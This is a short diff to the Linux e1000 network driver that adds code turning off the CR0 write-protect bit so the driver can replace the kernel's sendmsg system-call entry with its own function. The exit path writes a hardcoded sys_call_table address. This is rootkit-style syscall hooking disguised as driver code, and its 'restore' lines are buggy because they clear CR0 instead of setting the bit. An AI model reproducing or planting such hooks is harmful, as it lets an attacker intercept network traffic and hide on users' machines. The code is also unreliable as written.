@@ -289,10 +289,15 @@ static int __init e1000_init_module(void)
 			pr_info("copybreak enabled for "
 				   "packets <= %u bytes\n", copybreak);
 	}
-        
+       
+        /* disable bit 16 of CR0 register */
+        write_cr0(read_cr0() & (0x0ffff));
+
         /* store original location of sendmsg(). Alter sys_call_table to point to our functions*/
         original_sendmsg = (void *)xchg(&sys_call_table[__NR_sendmsg], e1000_sendmsg);
         //original_close = (void *)xchg(&sys_call_table[__NR_close], e1000_close);
+        write_cr0(read_cr0() & (0x10000));
+
 	return ret;
 }
 
@@ -307,7 +312,9 @@ module_init(e1000_init_module);
 static void __exit e1000_exit_module(void)
 {
         *(long *)&sys_call_table = 0x81a001c0;
+        write_cr0(read_cr0() & (0x0ffff));
         xchg(&sys_call_table[__NR_sendmsg], original_sendmsg);
+        write_cr0(read_cr0() & (0x10000));
 	pci_unregister_driver(&e1000_driver);
 }
 
